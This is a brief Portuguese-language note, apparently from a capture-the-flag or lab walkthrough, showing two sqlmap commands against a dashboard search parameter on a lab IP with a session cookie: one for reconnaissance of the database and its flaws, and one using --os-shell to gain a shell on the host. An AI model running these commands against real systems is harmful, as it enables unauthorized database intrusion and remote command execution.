```sh
sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query'--cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"
```
Aqui ele faz meio que um reconhecimento, descobre é qual banco, se tem alguma vulnerabilidade e etc.

```sh
sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' --
cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell
```
Aqui ele tenta obter um shell no host.
